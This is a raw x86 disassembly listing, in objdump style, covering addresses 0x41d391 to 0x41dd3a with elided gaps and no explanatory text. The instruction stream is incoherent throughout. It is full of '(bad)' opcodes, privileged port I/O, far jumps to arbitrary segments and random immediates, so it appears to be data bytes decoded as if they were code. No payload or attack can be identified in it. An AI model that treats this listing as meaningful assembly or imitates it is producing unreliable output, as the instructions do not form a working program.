  41d391:	mov    dl,0x12
  41d393:	aad    0xe2
  41d395:	out    dx,eax
  41d396:	retf   
  41d397:	out    dx,al
  41d398:	fcomp  QWORD PTR [ecx-0x2]
  41d39b:	sub    al,0xfe
  41d39d:	repnz pop es
  41d39f:	popf   
  41d3a0:	and    bh,BYTE PTR [ecx]
  41d3a2:	leave  
  41d3a3:	out    dx,eax
  41d3a4:	or     esp,ecx
  41d3a6:	jnp    0x41d328
  41d3a8:	pop    es
  41d3a9:	(bad)  
  41d3aa:	jle    0x41d374
  41d3ac:	mov    cl,0x68
  41d3ae:	xchg   ch,dl
  41d3b0:	push   ss
  41d3b1:	imul   edi,ebp,0xffffff9c
  41d3b4:	retf   0xd6b7
  41d3b7:	or     bh,BYTE PTR gs:[edx]
  41d3ba:	xchg   edx,eax
  41d3bb:	sar    eax,0x8c
  41d3be:	pop    ecx
  41d3bf:	iret   
  41d3c0:	push   edx
  41d3c1:	mov    esi,0x657a9b96
  41d3c6:	mov    cl,0x4e
  41d3c8:	out    0x3d,eax
  41d3ca:	inc    edx
  41d3cb:	pop    esi
  41d3cc:	ja     0x41d3a9
  41d3ce:	jecxz  0x41d3c0
  41d3d0:	das    
  41d3d1:	(bad)
  41d3d6:	xor    edi,DWORD PTR [eax]
  41d3d8:	mov    BYTE PTR [ecx+0x68],dh
  41d3db:	pushf  
  41d3dc:	xor    DWORD PTR [ebp+0x46],ebx
  41d3df:	lea    eax,[ebp-0x6]
  41d3e2:	push   eax
  41d3e3:	xchg   al,bl
  41d3e5:	rcl    BYTE PTR [ecx],0xac
  41d3e8:	push   esp
  41d3e9:	adc    ebx,DWORD PTR [edx-0x77]
  41d3ec:	mov    ss,WORD PTR [ebp+0x45]
  41d3ef:	scas   al,BYTE PTR es:[edi]
  41d3f0:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3f2:	pushf  
  41d3f3:	xor    cl,BYTE PTR [edx+0x1f]
  41d3f6:	fisttp QWORD PTR [ebx+0x76997a98]
  41d3fc:	jp     0x41d3be
  41d3fe:	mov    al,0x5
  41d400:	mov    eax,0xff5e3b76
  41d405:	test   al,0xc6
  41d407:	aaa    
  41d408:	sub    eax,edx
  41d40a:	jns    0x41d44e
  41d40c:	inc    ebx
  41d40d:	out    dx,al
  41d40e:	jbe    0x41d3d4
  41d410:	push   edi
  41d411:	sbb    ecx,DWORD PTR [eax-0x2b]
  41d414:	xchg   ecx,eax
  41d415:	fisubr WORD PTR [ebx-0x5995983e]
  41d41b:	test   DWORD PTR [esi],eax
  41d41d:	mov    ebx,ebp
  41d41f:	cwde   
  41d420:	stos   BYTE PTR es:[edi],al
  41d421:	fild   DWORD PTR [ecx]
  41d423:	cmp    BYTE PTR [eax+0x3e],0xd6
  41d427:	push   ebx
  41d428:	out    0x38,eax
  41d42a:	hlt    
  41d42b:	lods   al,BYTE PTR ds:[esi]
  41d42c:	jns    0x41d3fd
  41d42e:	in     al,dx
  41d42f:	sub    al,0x45
  41d431:	dec    edx
  41d432:	cmp    ah,0x81
  41d435:	add    cl,dh
  41d437:	stos   BYTE PTR es:[edi],al
  41d438:	neg    DWORD PTR [eax]
  41d43a:	adc    ch,BYTE PTR [esi+0x5522815d]
  41d440:	jbe    0x41d420
  41d442:	push   ebx
  41d443:	ja     0x41d3cc
  41d445:	xlat   BYTE PTR ds:[ebx]
  41d446:	dec    edi
  41d447:	sbb    DWORD PTR [edi+0x7c],edi
  41d44a:	add    BYTE PTR [eax],al
  41d44c:	push   cs
  41d44d:	inc    ebx
  41d44e:	mov    ah,0x87
  41d450:	jp     0x41d40a
  41d452:	mov    ds:0xfac923fe,eax
  41d457:	nop
  41d458:	fstp   QWORD PTR [edi]
  41d45a:	call   0x7369:0x795b294a
  41d461:	mov    ch,0x63
  41d463:	cld    
  41d464:	sar    BYTE PTR [ecx-0x216963d2],1
  41d46a:	into   
  41d46b:	loop   0x41d497
  41d46d:	inc    eax
  41d46e:	(bad)
  41d472:	add    DWORD PTR [edx*8-0x3c6ccb8a],esi
  41d479:	jmp    0x41d460
  41d47b:	sbb    al,0x97
  41d47d:	(bad)  
  41d47e:	push   ss
  41d47f:	pushf  
  41d480:	leave  
  41d481:	shl    BYTE PTR [ebp+eax*1-0x7dc942f9],0xb2
  41d489:	jnp    0x41d44d
  41d48b:	cdq    
  41d48c:	test   al,0x3c
  41d48f:	pop    ebp
	...
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6c73:0x7cbd3589
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	mov    esi,0x10885caf
  41d511:	inc    esi
  41d512:	mov    ebp,0x4a292a85
  41d517:	sbb    dl,ah
  41d519:	push   0xe977bf7f
  41d51e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d51f:	outs   dx,BYTE PTR ds:[esi]
  41d520:	jae    0x41d4cf
  41d522:	fs aad 0x5c
  41d525:	mov    al,ds:0x88e93ee0
  41d52a:	bswap  ebp
  41d52c:	out    dx,al
  41d52d:	dec    ecx
  41d52e:	seta   BYTE PTR [edx]
  41d531:	pop    ds
  41d532:	ja     0x41d59f
  41d534:	lea    esp,ds:0x2f0e3a
  41d53a:	xor    al,0x6b
  41d53c:	sub    DWORD PTR [edi-0x27],edi
  41d53f:	imul   ebp,ebx,0xffffffd8
  41d542:	outs   dx,BYTE PTR ds:[esi]
  41d543:	mov    edx,0x62309846
  41d548:	sub    eax,esi
  41d54a:	fimul  DWORD PTR [ebp+0x16]
  41d54d:	and    al,0xc0
  41d54f:	scas   eax,DWORD PTR es:[edi]
  41d550:	xor    DWORD PTR [esp+edx*8],eax
  41d553:	xchg   ebx,eax
  41d554:	xchg   ebx,eax
  41d555:	in     eax,dx
  41d556:	mov    eax,esi
  41d558:	out    dx,al
  41d559:	inc    edi
  41d55a:	sbb    DWORD PTR [esp+ebp*4+0xe611537],ebx
  41d561:	fs dec edx
  41d563:	mov    edi,0xa0291ab0
  41d568:	mov    cl,0xec
  41d56a:	xchg   edx,eax
  41d56b:	sbb    BYTE PTR [esp+ecx*4-0x2b],dh
  41d56f:	leave  
  41d570:	cmp    ah,ch
  41d572:	fcomi  st,st(2)
  41d574:	inc    edx
  41d575:	and    ebx,DWORD PTR [edx]
  41d577:	rcl    BYTE PTR [ecx],cl
  41d579:	lea    eax,[eax+0x43]
  41d57c:	pop    esi
  41d57d:	iret   
  41d57e:	lock inc ebp
  41d580:	jo     0x41d5db
  41d582:	(bad)  
  41d583:	mov    ds:0xf917b586,eax
  41d588:	not    BYTE PTR [ebx+0x5]
  41d58b:	mov    esp,0x83b2617b
  41d590:	pop    ecx
  41d591:	fcom   st(0)
  41d593:	int3   
  41d594:	in     al,dx
  41d595:	mov    bl,BYTE PTR [ecx+0x25]
  41d598:	fwait
  41d599:	xor    BYTE PTR [edx],dl
  41d59b:	cmp    eax,0x807ed848
  41d5a0:	js     0x41d559
  41d5a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a3:	xchg   BYTE PTR [eax],al
  41d5a5:	ret    0x633a
  41d5a8:	and    al,0xec
  41d5aa:	gs hlt 
  41d5ac:	push   eax
  41d5ad:	mov    cl,0x8e
  41d5af:	pusha  
  41d5b0:	int    0x48
  41d5b2:	adc    bl,BYTE PTR [ecx]
  41d5b4:	jmp    0x9c28:0x46b2fe4a
  41d5bb:	push   esp
  41d5bc:	cmp    dh,BYTE PTR [edx+0x4330c568]
  41d5c2:	push   es
  41d5c3:	mov    edi,0x839e8ac7
  41d5c8:	jge    0x41d639
  41d5ca:	(bad)  
  41d5cb:	cmp    esi,esp
  41d5cd:	inc    esp
  41d5ce:	out    dx,al
  41d5cf:	loopne 0x41d5ef
  41d5d1:	stos   DWORD PTR es:[edi],eax
  41d5d2:	int3   
  41d5d3:	fdivp  st(7),st
  41d5d5:	xchg   ebx,eax
  41d5d6:	xchg   ebp,eax
  41d5d7:	call   0xf1288b13
  41d5dc:	or     dh,ah
  41d5de:	rol    DWORD PTR [ebp+0x5e],1
  41d5e1:	std    
  41d5e2:	fwait
  41d5e3:	gs lock ds dec edx
  41d5e7:	inc    edx
  41d5e8:	cmp    al,0x47
  41d5ea:	imul   BYTE PTR [edi+0x72]
  41d5ed:	shl    BYTE PTR [esi+0x65],1
  41d5f0:	imul   esp,DWORD PTR [edi-0xa8ea517],0xb295411f
  41d5fa:	xchg   esi,eax
  41d5fb:	push   edi
  41d5fc:	mov    ds:0xfc84aebd,al
  41d601:	mov    eax,ds:0x45487c46
  41d606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d607:	and    al,0xa2
  41d609:	nop
  41d60a:	mov    dl,BYTE PTR [esi+ebx*1+0x55f9eb]
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x7066e435
  41d681:	jecxz  0x41d698
  41d683:	sub    eax,0x13870
  41d688:	add    al,0x1
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	pop    esi
  41d68d:	fild   DWORD PTR ds:0x2d3b34cd
  41d693:	pop    esp
  41d694:	xchg   ecx,eax
  41d695:	pop    eax
  41d696:	or     DWORD PTR [edx+0x43bca3a9],esp
  41d69c:	mov    ebx,0xa80d6048
  41d6a1:	dec    esi
  41d6a2:	adc    BYTE PTR ds:[edi],bh
  41d6a5:	jmp    0xbd3105ce
  41d6aa:	retf   0xb1f6
  41d6ad:	dec    esp
  41d6ae:	lods   eax,DWORD PTR ds:[esi]
  41d6af:	les    ebx,FWORD PTR ds:0xe135331d
  41d6b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6b7:	out    dx,al
  41d6b8:	jnp    0x41d72c
  41d6ba:	lea    esp,[ebx+0x20]
  41d6bd:	stos   BYTE PTR es:[edi],al
  41d6be:	cmp    DWORD PTR [esi],edi
  41d6c0:	sbb    ebx,DWORD PTR [edx+0x38395d2]
  41d6c6:	inc    BYTE PTR [edx+edi*2-0xc]
  41d6ca:	pop    ecx
  41d6cb:	into   
  41d6cc:	mov    dh,0xe9
  41d6ce:	sbb    ebx,DWORD PTR [ecx-0x291c1ae7]
  41d6d4:	push   ecx
  41d6d5:	pop    ebp
  41d6d6:	dec    edi
  41d6d7:	jb     0x41d6e0
  41d6d9:	lahf   
  41d6da:	in     al,0xde
  41d6dc:	test   eax,0x5012e3a9
  41d6e1:	pushf  
  41d6e2:	add    edx,DWORD PTR [edi-0x5d]
  41d6e5:	fs call 0xe65aae25
  41d6eb:	retf   0xa4b2
  41d6ee:	stos   DWORD PTR es:[edi],eax
  41d6ef:	mov    esi,0xf24f892c
  41d6f4:	loope  0x41d6f6
  41d6f6:	jp     0x41d762
  41d6f8:	or     dl,BYTE PTR [ecx+0xf3b26a0]
  41d6fe:	jbe    0x41d6d3
  41d700:	cmp    esi,DWORD PTR [esi+0x45fa2013]
  41d706:	test   BYTE PTR [edx-0x13050f6d],al
  41d70c:	mov    ebx,0xede98794
  41d711:	or     esi,0xa769ffc8
  41d717:	inc    ecx
  41d718:	(bad)  
  41d719:	and    DWORD PTR [ecx+0x5d],esp
  41d71c:	push   cs
  41d71d:	add    eax,0xbcc4c146
  41d722:	dec    esi
  41d723:	jmp    0x1654683b
  41d728:	jmp    0x316bd6
  41d72d:	mov    ah,0xd9
  41d72f:	sbb    eax,0x3d224c90
  41d734:	push   ebx
  41d735:	jmp    0x41d76c
  41d737:	push   ecx
  41d738:	pop    eax
  41d739:	ins    BYTE PTR es:[edi],dx
  41d73a:	or     dl,BYTE PTR [esi-0x4d88ee53]
  41d740:	pop    esi
  41d741:	mov    ch,al
  41d743:	or     DWORD PTR [edx],0x6ff988cc
  41d749:	cmp    DWORD PTR [edx-0x15],ebp
  41d74c:	xor    BYTE PTR [esi+esi*4+0x44e35021],0x7
  41d754:	push   0x361dd34d
  41d759:	pop    ebp
  41d75a:	xlat   BYTE PTR ds:[ebx]
  41d75b:	ret    
  41d75c:	sub    dh,BYTE PTR [edi+0x2]
  41d75f:	clc    
  41d760:	sbb    eax,esi
  41d762:	icebp  
  41d763:	call   0x2e359e3a
  41d768:	cmp    esi,esi
  41d76a:	add    ch,ch
  41d76c:	push   0xffffffae
  41d76e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d76f:	mov    edi,0xecb3c010
  41d774:	pop    eax
  41d775:	mov    eax,0x5e826342
  41d77a:	ja     0x41d7c3
  41d77c:	inc    edi
  41d77d:	rol    edx,0xe9
  41d780:	mov    eax,ds:0xada2ea60
  41d785:	mov    ds:0x17ddbcbb,al
  41d78a:	xchg   ebx,eax
  41d78b:	inc    edi
  41d78c:	jmp    0x0:0x350079
	...
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	pop    edi
  41d801:	push   es
  41d802:	ss das 
  41d804:	je     0x41d83f
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    al,0x1
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	jno    0x41d7e0
  41d80e:	aas    
  41d80f:	lds    esp,FWORD PTR fs:[esi-0x6a]
  41d813:	lods   eax,DWORD PTR ds:[esi]
  41d814:	push   esp
  41d815:	(bad)
  41d818:	and    eax,0xba0f9cf3
  41d81d:	les    eax,FWORD PTR [eax]
  41d81f:	outs   dx,BYTE PTR ds:[esi]
  41d820:	mov    dh,0x4e
  41d822:	neg    BYTE PTR ds:0xaee9bbb3
  41d828:	rcr    BYTE PTR [ebp+0x63],cl
  41d82b:	xchg   DWORD PTR [ebx-0x4d443fc0],eax
  41d831:	xor    dh,BYTE PTR [esi+edx*8+0x35f6917c]
  41d838:	or     eax,0x797da3e2
  41d83d:	(bad)
  41d840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d841:	mov    esp,0x82d2a3cd
  41d846:	rcr    BYTE PTR [esi+0x4d],0xd0
  41d84a:	or     BYTE PTR [eax-0x793e7c34],ah
  41d850:	aad    0xe0
  41d852:	add    DWORD PTR [esi-0x7d],edi
  41d855:	and    al,BYTE PTR [esi-0x4f055f6c]
  41d85b:	ret    0xd46b
  41d85e:	fistp  WORD PTR [eax-0x57]
  41d861:	ins    BYTE PTR es:[edi],dx
  41d862:	out    dx,al
  41d863:	out    dx,al
  41d864:	mov    ds:0xd38c5270,eax
  41d869:	inc    edx
  41d86a:	xchg   BYTE PTR [esi],dl
  41d86c:	or     ebp,DWORD PTR [ecx+0x6cf6e771]
  41d872:	add    ch,cl
  41d874:	pop    esi
  41d875:	les    edx,FWORD PTR [eax+0x4cc29c34]
  41d87b:	shl    DWORD PTR [eax-0x4f744cef],cl
  41d881:	ret    
  41d882:	fisubr WORD PTR [eax+eiz*1-0x64cb9b59]
  41d889:	int    0xbe
  41d88b:	(bad)  
  41d88d:	retf   0x35fc
  41d890:	sar    BYTE PTR [ebx+0x1d],1
  41d893:	enter  0x586c,0x68
  41d897:	rcl    DWORD PTR [esp+edx*2-0x49],1
  41d89b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d89c:	xor    al,0xc4
  41d89e:	ret    
  41d89f:	cmp    ch,0x75
  41d8a2:	lods   al,BYTE PTR ds:[esi]
  41d8a3:	pop    ebp
  41d8a4:	cmp    dl,BYTE PTR [edx+ebx*2+0x27]
  41d8a8:	ss inc eax
  41d8aa:	add    bl,dl
  41d8ac:	out    0x40,eax
  41d8ae:	xchg   edi,eax
  41d8af:	cmp    al,0x3c
  41d8b1:	data16 lock int3 
  41d8b4:	mov    cl,0x53
  41d8b6:	inc    eax
  41d8b7:	push   ds
  41d8b8:	or     BYTE PTR [edi+0x1ef7dd02],bh
  41d8be:	mov    DWORD PTR [ebx],edi
  41d8c0:	scas   eax,DWORD PTR es:[edi]
  41d8c1:	add    DWORD PTR [ecx+0x3a],edx
  41d8c4:	loop   0x41d86a
  41d8c6:	pop    edi
  41d8c7:	push   es
  41d8c8:	jb     0x41d8bd
  41d8ca:	mov    bl,0xd8
  41d8cc:	gs pop ds
  41d8ce:	pushf  
  41d8cf:	sub    ebp,edx
  41d8d1:	or     bl,BYTE PTR [eax]
  41d8d3:	and    cl,cl
  41d8d5:	mov    BYTE PTR [edx],cl
  41d8d7:	mov    ebp,0x577e7274
  41d8dc:	push   edx
  41d8dd:	imul   ebx,DWORD PTR [eax],0xa3dc2a1f
  41d8e3:	inc    ebp
  41d8e4:	rol    BYTE PTR [esi+eax*2-0x25],1
  41d8e8:	push   ecx
  41d8e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8ea:	xchg   ebp,eax
  41d8eb:	add    cl,BYTE PTR [ecx-0x17]
  41d8ee:	rol    ebp,cl
  41d8f0:	and    al,0x41
  41d8f2:	jmp    0x29efc81e
  41d8f7:	mov    cl,BYTE PTR [ebx+eiz*4-0x5482f4cd]
  41d8fe:	mov    ah,0xe7
  41d900:	jle    0x41d8ce
  41d902:	or     esp,DWORD PTR [eax]
  41d904:	pusha  
  41d905:	mov    eax,ds:0x4d03c174
  41d90a:	shl    BYTE PTR [esi-0x23f49d0e],cl
	...
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs xor al,0x70
  41d982:	outs   dx,DWORD PTR ds:[esi]
  41d983:	jge    0x41d9fd
  41d985:	cmp    al,BYTE PTR [ecx]
  41d987:	add    BYTE PTR [ecx+eax*1],al
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	add    eax,0xeae3fcc3
  41d991:	test   eax,0x44f56144
  41d996:	sub    BYTE PTR [eax],ch
  41d998:	cmc    
  41d999:	pop    ds
  41d99a:	iret   
  41d99b:	mov    ah,0xe5
  41d99d:	sar    DWORD PTR [esp+ebp*8],0x6d
  41d9a1:	int    0x62
  41d9a3:	jge    0x41d94d
  41d9a5:	mov    esi,0x649688f
  41d9aa:	mov    cl,0xe3
  41d9ac:	in     al,dx
  41d9ad:	jl     0x41da10
  41d9af:	es fcmovnu st,st(3)
  41d9b2:	or     BYTE PTR [eax-0x15],ah
  41d9b5:	in     eax,dx
  41d9b6:	das    
  41d9b7:	outs   dx,BYTE PTR es:[esi]
  41d9b9:	lds    ebx,FWORD PTR [edi-0x5da32bf1]
  41d9bf:	pop    edx
  41d9c0:	sbb    bh,cl
  41d9c2:	es pop esp
  41d9c4:	aas    
  41d9c5:	aas    
  41d9c6:	lock and eax,0x468a7dcf
  41d9cc:	pushf  
  41d9cd:	inc    esp
  41d9ce:	dec    esp
  41d9cf:	pop    ebx
  41d9d0:	stos   BYTE PTR es:[edi],al
  41d9d1:	ret    0x3a0e
  41d9d4:	jae    0x41da30
  41d9d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9d7:	push   ds
  41d9d8:	pop    ebp
  41d9d9:	add    DWORD PTR [ebx+0x3fad7407],0x7c9ba590
  41d9e3:	lds    esp,FWORD PTR [ebp-0x62]
  41d9e6:	adc    eax,DWORD PTR [ebx+ebx*8+0x385ad69a]
  41d9ed:	mov    ch,0x59
  41d9ef:	icebp  
  41d9f0:	gs mov ebp,0xe576c0f5
  41d9f6:	(bad)  
  41d9f7:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9f9:	out    0x33,al
  41d9fb:	lods   eax,DWORD PTR ds:[esi]
  41d9fc:	dec    esp
  41d9fd:	jge    0x41da3c
  41d9ff:	xchg   ebx,eax
  41da00:	dec    esi
  41da01:	pop    ds
  41da02:	jbe    0x41d9a4
  41da04:	push   ds
  41da05:	sbb    DWORD PTR [eax-0x45],esi
  41da08:	adc    al,0xb0
  41da0a:	push   esi
  41da0b:	sbb    bl,bl
  41da0d:	(bad)  
  41da0e:	jmp    0x6430:0x179d8428
  41da15:	(bad)  
  41da17:	cmp    bh,BYTE PTR ss:[ebx-0x4e]
  41da1b:	jno    0x41da2a
  41da1d:	xchg   esp,eax
  41da1e:	fldcw  WORD PTR [ebx-0x2f4195c2]
  41da24:	loop   0x41da76
  41da26:	xor    ah,BYTE PTR [ebx]
  41da28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da29:	xchg   ecx,eax
  41da2a:	mov    al,ds:0xb2add8da
  41da2f:	inc    eax
  41da30:	mov    ds:0xa0996787,al
  41da35:	xchg   DWORD PTR [ebx],edx
  41da37:	icebp  
  41da38:	adc    DWORD PTR [ebp-0x9e5f950],edx
  41da3e:	xor    ebx,0x6d9eb0f8
  41da44:	addr16 out 0x93,al
  41da47:	mov    dl,BYTE PTR [ecx+ebx*2+0x6c6a8ebc]
  41da4e:	fistp  QWORD PTR [edi+0x6f896a1e]
  41da54:	pop    eax
  41da55:	jo     0x41da43
  41da57:	sub    BYTE PTR [ecx+0x6],0xaa
  41da5b:	in     eax,0xda
  41da5d:	mov    esi,0x153a0ac4
  41da62:	fwait
  41da63:	mov    cl,0x91
  41da65:	lods   al,BYTE PTR ds:[esi]
  41da66:	ss jo  0x41dada
  41da69:	xor    dl,BYTE PTR [ecx]
  41da6b:	mov    ebx,0x9d2b192c
  41da70:	or     ecx,DWORD PTR [eax]
  41da72:	shl    DWORD PTR [ecx],1
  41da74:	push   eax
  41da75:	push   0x413d2429
  41da7a:	cli    
  41da7b:	loope  0x41da05
  41da7d:	(bad)  
  41da7e:	aam    0xa4
  41da80:	cmp    eax,0x8125abe2
  41da85:	pusha  
  41da86:	or     DWORD PTR [edx+0x46544b7e],esp
  41da8c:	out    0x54,al
  41da8e:	and    bl,BYTE PTR [esi+0x0]
	...
  41daf1:	add    BYTE PTR [eax],al
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xffffffec
  41db01:	cdq    
  41db02:	test   al,0xf6
  41db04:	jl     0x41db41
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    al,0x1
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	stos   BYTE PTR es:[edi],al
  41db0d:	mov    ch,0x76
  41db0f:	xchg   esp,eax
  41db10:	jns    0x41dab0
  41db12:	in     eax,dx
  41db13:	std    
  41db14:	sahf   
  41db15:	mov    ebp,0x21f98d69
  41db1a:	adc    DWORD PTR [ebp-0x33],0x2c
  41db1e:	inc    esi
  41db1f:	sbb    al,0x61
  41db21:	push   cs
  41db22:	adc    edi,eax
  41db24:	jle    0x41db14
  41db26:	jmp    0x41dae9
  41db28:	jp     0x41db57
  41db2a:	cmp    ch,BYTE PTR [esi+0x7c9881b4]
  41db30:	sahf   
  41db31:	in     al,0xc7
  41db33:	jecxz  0x41db5a
  41db35:	mov    DWORD PTR [edi-0x48],0x631e58b8
  41db3c:	out    0x98,al
  41db3e:	jle    0x41db72
  41db40:	or     eax,0x16cef61a
  41db45:	loop   0x41db48
  41db47:	mov    eax,0x6eb68c5f
  41db4c:	cmp    al,0xb6
  41db4e:	add    esp,esi
  41db50:	stos   BYTE PTR es:[edi],al
  41db51:	lds    ebx,FWORD PTR [edx]
  41db53:	fidivr DWORD PTR [edx+0x1c1aede7]
  41db59:	mov    BYTE PTR [eax],0x6b
  41db5c:	jne    0x41db97
  41db5e:	push   ss
  41db5f:	jno    0x41db72
  41db61:	dec    ecx
  41db62:	mov    ah,0xa3
  41db64:	dec    esi
  41db65:	dec    edi
  41db66:	sub    eax,0x93589381
  41db6b:	adc    al,0xe9
  41db6d:	int    0xd2
  41db6f:	cmp    BYTE PTR [esp+edx*8+0x3a56b77e],cl
  41db76:	cmc    
  41db77:	ds cmp bl,dh
  41db7a:	jp     0x41db9e
  41db7c:	dec    edi
  41db7d:	pop    es
  41db7e:	sbb    DWORD PTR [edx+0x75822981],esp
  41db84:	mov    edi,0x3b9cd83d
  41db89:	xchg   DWORD PTR [ebx+0x6f8e05d8],edi
  41db8f:	or     cl,0xe4
  41db92:	sqrtps xmm3,XMMWORD PTR [eax+0x13]
  41db96:	push   eax
  41db97:	cmp    dh,bl
  41db99:	add    DWORD PTR [edx+0x5],0xffffffe3
  41db9d:	sbb    al,0xff
  41db9f:	out    0x62,eax
  41dba1:	adc    cl,ah
  41dba3:	jo     0x41dbce
  41dba5:	in     al,0x68
  41dba7:	cdq    
  41dba8:	sbb    al,0x15
  41dbaa:	test   al,0xde
  41dbac:	or     al,0x62
  41dbae:	mov    al,0xbd
  41dbb0:	stos   DWORD PTR es:[edi],eax
  41dbb1:	(bad)  
  41dbb4:	fst    QWORD PTR [ebx]
  41dbb6:	(bad)  
  41dbb7:	pop    ebp
  41dbb8:	sbb    al,0xa3
  41dbba:	in     al,dx
  41dbbb:	xor    DWORD PTR [ebx+edi*2+0x59b0a6a9],0x39
  41dbc3:	xor    ah,BYTE PTR [ebx-0x3c]
  41dbc6:	rol    DWORD PTR [ebx+0x3a],cl
  41dbc9:	ins    DWORD PTR es:[edi],dx
  41dbca:	and    eax,0xbbdb72c2
  41dbcf:	out    0xd8,eax
  41dbd1:	(bad)  
  41dbd2:	cwde   
  41dbd3:	jl     0x41dbf6
  41dbd5:	mov    eax,ds:0xf0b1bf35
  41dbda:	xor    dh,BYTE PTR [ebp-0x54]
  41dbdd:	push   ebx
  41dbde:	int3   
  41dbdf:	icebp  
  41dbe0:	jmp    0x41dba6
  41dbe2:	leave  
  41dbe3:	(bad)  
  41dbe4:	dec    edx
  41dbe5:	mov    esp,cs
  41dbe7:	jg     0x41dc42
  41dbe9:	add    al,0x45
  41dbeb:	in     eax,0xc2
  41dbed:	mov    ch,0xe2
  41dbef:	test   edx,0x6120b7c
  41dbf5:	imul   edi,DWORD PTR [edx+esi*1+0x535dfe59],0x3792b38d
  41dc00:	in     eax,dx
  41dc01:	es pop es
  41dc03:	in     al,0x66
  41dc05:	adc    DWORD PTR [ecx],0x3250d756
  41dc0b:	inc    DWORD PTR [ebp+0x30d2ca]
	...
  41dc71:	add    BYTE PTR [eax],al
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi+0x3eb0d050]
  41dc81:	sub    DWORD PTR es:[edi-0x80],0x3c
  41dc86:	add    DWORD PTR [eax],eax
  41dc88:	add    al,0x1
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	push   ss
  41dc8d:	int    0x89
  41dc8f:	and    al,0x50
  41dc91:	shl    BYTE PTR [eax+0x1aacf9e1],0x22
  41dc98:	js     0x41dc7c
  41dc9a:	cmp    DWORD PTR [ecx],edx
  41dc9c:	mov    DWORD PTR [esi],edx
  41dc9e:	sub    BYTE PTR [ebp+edx*8-0x2bb320f9],bl
  41dca5:	xchg   ebp,eax
  41dca6:	outs   dx,BYTE PTR ds:[esi]
  41dca7:	mov    esp,0x717a59cf
  41dcac:	retf   
  41dcad:	adc    al,0xd6
  41dcaf:	in     al,dx
  41dcb0:	(bad)  
  41dcb1:	dec    esi
  41dcb2:	loope  0x41dc58
  41dcb4:	add    eax,0x1cabab65
  41dcb9:	pop    esp
  41dcba:	(bad)
  41dcbd:	dec    eax
  41dcbe:	push   ebp
  41dcbf:	adc    eax,DWORD PTR ds:0x2cdfa701
  41dcc5:	repz mov ds:0xdb306f2b,al
  41dccb:	push   edx
  41dccc:	daa    
  41dccd:	xchg   ebp,eax
  41dcce:	pop    edi
  41dccf:	cmp    edi,DWORD PTR [edx]
  41dcd1:	cmp    dl,bl
  41dcd3:	sbb    DWORD PTR [ebx-0x1a],eax
  41dcd6:	jg     0x41dd38
  41dcd8:	push   edi
  41dcd9:	imul   ebx,ecx,0x6a
  41dcdc:	into   
  41dcdd:	sbb    BYTE PTR [ecx+0x54997fd7],ch
  41dce3:	mov    bl,0xe9
  41dce5:	xor    al,BYTE PTR [ebx-0x1e30ee06]
  41dceb:	lods   eax,DWORD PTR ds:[esi]
  41dcec:	stos   BYTE PTR es:[edi],al
  41dced:	frstor ds:0xa3982754
  41dcf3:	and    eax,0x248fd80a
  41dcf8:	pop    ss
  41dcf9:	and    al,0x6d
  41dcfb:	pop    esi
  41dcfc:	mov    al,ds:0x2c842056
  41dd01:	outs   dx,BYTE PTR ds:[esi]
  41dd02:	outs   dx,BYTE PTR ds:[esi]
  41dd03:	int3   
  41dd04:	push   0xffffff83
  41dd06:	xchg   edi,eax
  41dd07:	fnstenv [esi-0x7a53336a]
  41dd0d:	jae    0x41dd18
  41dd0f:	jge    0x41dd4d
  41dd11:	bound  edi,QWORD PTR fs:[ebx-0x62]
  41dd15:	cmp    dl,BYTE PTR [edx+0x3228c8c9]
  41dd1b:	arpl   WORD PTR [ecx-0x5f],ax
  41dd1e:	out    dx,eax
  41dd1f:	adc    cl,BYTE PTR [eax+0x4a]
  41dd22:	popf   
  41dd23:	fldenv ds:0x391724a3
  41dd29:	es mov ebx,0xab067c45
  41dd2f:	mov    edx,0xde486a58
  41dd34:	rol    BYTE PTR [ecx+0xc6cd3a4],cl
  41dd3a:	sti    
